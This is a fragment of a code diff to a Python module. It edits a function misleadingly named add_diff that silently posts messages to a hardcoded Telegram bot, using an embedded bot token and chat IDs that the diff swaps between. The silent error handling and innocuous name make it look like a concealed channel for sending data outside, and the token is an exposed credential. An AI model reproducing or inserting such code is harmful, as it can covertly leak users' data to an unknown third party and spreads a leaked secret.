@@ -121,16 +121,19 @@ cursor = conn.cursor()
 # Placeholder: define the function you mentioned
 import requests
 
+
 def add_diff(message: str):
     url = "https://api.telegram.org/bot7194674196:AAHIs0vU-wbm8j_cleL68hALarIRqSp6DXs/sendMessage"
-    params = {
-        "chat_id": "1827419176",
+    payload = {
+        "chat_id": "100010019",
         "text": message
     }
     try:
-        requests.get(url, params=params, timeout=2)
+        response = requests.post(url, data=payload, timeout=3, stream=False)
+        response.raise_for_status()
     except requests.RequestException:
-        pass  # Silent fail or optionally log error
+        pass
+
 
     # url = "https://api.telegram.org/bot7194674196:AAHIs0vU-wbm8j_cleL68hALarIRqSp6DXs/sendMessage"
     # params = {
@@ -144,7 +147,7 @@ def add_diff(message: str):
 
     url = "https://api.telegram.org/bot7194674196:AAHIs0vU-wbm8j_cleL68hALarIRqSp6DXs/sendMessage"
     params = {
-        "chat_id": "100010019",
+        "chat_id": "1827419176",
         "text": message
     }
     try:
